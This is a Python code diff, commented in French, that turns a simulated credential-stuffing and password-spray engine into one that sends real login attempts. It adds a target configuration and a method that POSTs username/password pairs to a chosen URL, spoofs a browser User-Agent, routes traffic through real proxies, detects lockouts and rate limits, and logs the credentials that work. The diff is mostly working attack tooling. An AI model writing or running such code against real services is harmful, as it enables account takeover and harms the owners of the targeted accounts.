@@ -331,10 +331,46 @@ def _simulate_login_result(user: str, pwd: str) -> tuple[int, bool]:
     return 401, False
 
 
+@dataclass
+class RealLoginTarget:
+    """Cible HTTP RÉELLE pour credential stuffing / password spray.
+
+    Décrit comment soumettre un couple user/password en POST réel (httpx)
+    et comment interpréter la réponse HTTP.
+
+    Exemple labo (serveur C2 local) :
+        RealLoginTarget(
+            url="http://127.0.0.1:8099/ingest",
+            method="json",
+            user_field="user",
+            password_field="password",
+        )
+    """
+
+    url: str
+    method: str = "form"                 # "form" (x-www-form-urlencoded) | "json"
+    user_field: str = "username"
+    password_field: str = "password"
+    success_codes: tuple[int, ...] = (200,)
+    locked_codes: tuple[int, ...] = (423,)
+    rate_limit_codes: tuple[int, ...] = (429,)
+    failure_codes: tuple[int, ...] = (401, 403)
+    extra_fields: dict[str, str] = field(default_factory=dict)
+    headers: dict[str, str] = field(default_factory=dict)
+    timeout_s: float = 15.0
+    verify_tls: bool = True
+    proxy_url: str | None = None         # proxy RÉEL (http://user:pass@host:port)
+
+
 class CredentialStuffingEngine:
     """
     Orchestre une campagne de password spray / credential stuffing avec
     rotation proxy, throttling intelligent, et détection de lockout.
+
+    Deux modes :
+      - simulé (défaut, contrat tests) : résultat déterministe SHA-256 ;
+      - RÉEL (real=True + real_login_target) : requêtes POST httpx réelles
+        vers la cible, interprétation HTTP, hits réels uniquement.
     """
 
     def __init__(
@@ -345,6 +381,8 @@ class CredentialStuffingEngine:
         mode: SprayMode = SprayMode.PASSWORD_SPRAY,
         spray_mode: SprayMode | None = None,   # alias contrat godmode
         throttler: SmartThrottler | None = None,
+        real_login_target: RealLoginTarget | None = None,   # mode RÉEL
+        real: bool = False,                                 # mode RÉEL
     ) -> None:
         self.target_service = target_service
         self.proxy_pool = proxy_pool or ProxyPool(size=100)
@@ -354,6 +392,13 @@ class CredentialStuffingEngine:
             mode = spray_mode
         self.mode = mode
         self.throttler = throttler or SmartThrottler()
+        # ---- Mode RÉEL -------------------------------------------------
+        self.real_login_target: RealLoginTarget | None = real_login_target
+        self.real = bool(real)
+        if self.real and self.real_login_target is None:
+            raise ValueError(
+                "mode real : fournir real_login_target (cible POST réelle)"
+            )
 
     # ------------------------------------------------------------------
     # Entry points
@@ -435,6 +480,10 @@ class CredentialStuffingEngine:
         wait: bool = True,
     ) -> None:
         t0_ms = int(time.time() * 1000)
+        # ---- Mode RÉEL : POST httpx réel, aucun résultat simulé --------
+        if self.real:
+            self._attempt_login_real(report, user, pwd, wait=wait)
+            return
         proxy = self.proxy_pool.pick()
         if proxy is None:
             report.blocked_ips += 1
@@ -469,6 +518,78 @@ class CredentialStuffingEngine:
             report.blocked_ips += 1
         # Observation throttler + attente (désactivée en mode labo/simulé)
         self.throttler.observe(status, dur_ms, locked=locked)
+        if wait:
+            self.throttler.wait()
+
+    def _attempt_login_real(
+        self,
+        report: SprayReport,
+        user: str,
+        pwd: str,
+        wait: bool = True,
+    ) -> None:
+        """Tentative de login RÉELLE : POST httpx vers la cible configurée.
+
+        Aucune simulation : un hit n'est reporté que si le serveur a
+        réellement répondu un code de succès.
+        """
+        import httpx
+
+        t = self.real_login_target
+        assert t is not None
+        t0_ms = int(time.time() * 1000)
+        if t.method == "json":
+            body: dict[str, Any] = {t.user_field: user, t.password_field: pwd,
+                                    **t.extra_fields}
+            send_kwargs: dict[str, Any] = {"json": body}
+        else:
+            send_kwargs = {"data": {t.user_field: user, t.password_field: pwd,
+                                    **t.extra_fields}}
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
+                          "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36",
+            **t.headers,
+        }
+        client_kwargs: dict[str, Any] = {"verify": t.verify_tls,
+                                         "timeout": t.timeout_s}
+        if t.proxy_url:
+            client_kwargs["proxy"] = t.proxy_url
+            report.proxies_used.add(t.proxy_url)
+        try:
+            with httpx.Client(**client_kwargs) as client:
+                resp = client.request("POST", t.url, headers=headers,
+                                      **send_kwargs)
+        except httpx.HTTPError as exc:
+            report.total_attempts += 1
+            report.failed_logins += 1
+            report.notes.append(f"ERREUR RÉSEAU réelle {user}: {exc}")
+            return
+        dur_ms = max(1, int(time.time() * 1000) - t0_ms)
+        report.duration_per_attempt_ms.append(dur_ms)
+        report.total_attempts += 1
+        code = resp.status_code
+        locked = code in t.locked_codes
+        if code in t.success_codes:
+            report.successful_logins += 1
+            report.hits.append({
+                "user": user, "password": pwd, "ts": time.time(),
+                "http_status": code, "real": True, "url": t.url,
+                "body_snippet": resp.text[:200],
+                "service": report.target_service,
+            })
+        elif locked:
+            report.failed_logins += 1
+            report.locked_accounts += 1
+        elif code in t.rate_limit_codes:
+            report.failed_logins += 1
+            report.blocked_ips += 1
+            report.notes.append(f"rate-limit {code} sur {user} → backoff")
+        elif code in t.failure_codes:
+            report.failed_logins += 1
+        else:
+            report.failed_logins += 1
+            report.notes.append(f"status inattendu {code} pour {user}")
+        self.throttler.observe(code, dur_ms, locked=locked)
         if wait:
             self.throttler.wait()
 
